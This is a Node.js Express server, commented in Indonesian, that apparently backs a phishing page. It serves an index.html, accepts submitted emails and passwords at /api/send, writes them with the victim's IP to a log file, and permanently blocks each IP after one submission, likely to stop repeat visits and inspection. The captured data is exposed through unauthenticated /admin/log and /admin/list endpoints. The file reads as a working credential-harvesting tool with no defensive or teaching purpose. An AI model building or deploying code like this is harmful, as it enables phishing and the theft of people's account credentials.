const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

const PORT = process.env.PORT || 3000;
const DB_FILE = path.join(__dirname, 'blocked_ips.json');
const LOG_FILE = path.join(__dirname, 'data_masuk.log');

app.use(express.json());
app.use(express.static(__dirname));

/* ================== HELPER DB ================== */
function loadDB(){
    if(!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, JSON.stringify([]));
    try { return JSON.parse(fs.readFileSync(DB_FILE, 'utf-8')); }
    catch(e){ return []; }
}

function saveDB(data){
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
}

/* ================== GET CLIENT IP ================== */
function getClientIP(req){
    let ip = req.headers['x-forwarded-for'] ||
             req.headers['cf-connecting-ip'] ||
             req.connection?.remoteAddress ||
             req.socket?.remoteAddress ||
             req.ip;

    if(ip && ip.includes(',')) ip = ip.split(',')[0].trim();
    if(ip && ip.startsWith('::ffff:')) ip = ip.replace('::ffff:', '');
    return ip || 'unknown';
}

/* ================== MIDDLEWARE BLOCK ================== */
function checkBlocked(req, res, next){
    const ip = getClientIP(req);
    const db = loadDB();
    const found = db.find(x => x.ip === ip);

    if(found){
        return res.status(403).send(`
            <!DOCTYPE html>
            <html><head><meta charset="UTF-8">
            <meta name="viewport" content="width=device-width,initial-scale=1.0">
            <title>403 - Akses Ditolak</title>
            <style>
                *{box-sizing:border-box;margin:0;padding:0;}
                body{display:flex;align-items:center;justify-content:center;
                     min-height:100vh;margin:0;background:#f8f9fa;
                     font-family:Arial,Helvetica,sans-serif;color:#333;
                     padding:20px;}
                .card{background:#fff;padding:60px 80px;border-radius:20px;
                      box-shadow:0 4px 24px rgba(0,0,0,.08);text-align:center;
                      border:1px solid #eee;max-width:480px;width:100%;}
                .code{font-size:96px;font-weight:800;color:#e63946;
                      letter-spacing:-4px;line-height:1;}
                .line{width:70px;height:5px;background:#ffc9ce;
                      border-radius:3px;margin:22px auto;}
                h2{font-size:26px;color:#1a1a2e;margin:0 0 14px;font-weight:700;}
                p{color:#9aa0a6;font-size:15px;margin:0;}
                @media(max-width:480px){
                    .card{padding:40px 28px;}
                    .code{font-size:72px;}
                    h2{font-size:22px;}
                }
            </style></head>
            <body><div class="card">
                <div class="code">403</div>
                <div class="line"></div>
                <h2>Akses Ditolak</h2>
                <p>IP Anda telah diblokir.</p>
            </div></body></html>
        `);
    }

    req.clientIP = ip;
    next();
}

/* ================== ROUTE UTAMA ================== */
app.get('/', checkBlocked, (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

/* ================== ENDPOINT SUBMIT ================== */
app.post('/api/send', checkBlocked, (req, res) => {

    const ip = req.clientIP;
    const data = req.body;

    if(!data || !data.email || !data.password){
        return res.status(400).json({ status:false, msg:'Data tidak lengkap' });
    }

    fs.appendFileSync(LOG_FILE,
        `[${new Date().toISOString()}] IP=${ip} | ${JSON.stringify(data)}\n`
    );

    const db = loadDB();
    if(!db.find(x => x.ip === ip)){
        db.push({
            ip,
            firstSubmit: new Date().toISOString(),
            email: data.email
        });
        saveDB(db);
    }

    console.log(`[BLOCKED] ${ip} sudah submit & diblokir permanen.`);

    res.json({ status:true, msg:'OK', blocked:true });
});

/* ================== ADMIN ================== */
app.get('/admin/list', (req, res) => {
    res.json(loadDB());
});

app.get('/admin/unblock/:ip', (req, res) => {
    const target = req.params.ip;
    let db = loadDB();
    const before = db.length;
    db = db.filter(x => x.ip !== target);
    saveDB(db);
    res.json({ status:true, removed: before - db.length });
});

app.get('/admin/log', (req, res) => {
    if(!fs.existsSync(LOG_FILE)) return res.send('Belum ada data.');
    res.type('text/plain').send(fs.readFileSync(LOG_FILE, 'utf-8'));
});

/* ================== START ================== */
app.listen(PORT, () => {
    console.log(`🔥 Server nyala di http://localhost:${PORT}`);
    console.log(`💀 IP yang udah submit bakal diblokir otomatis.`);
});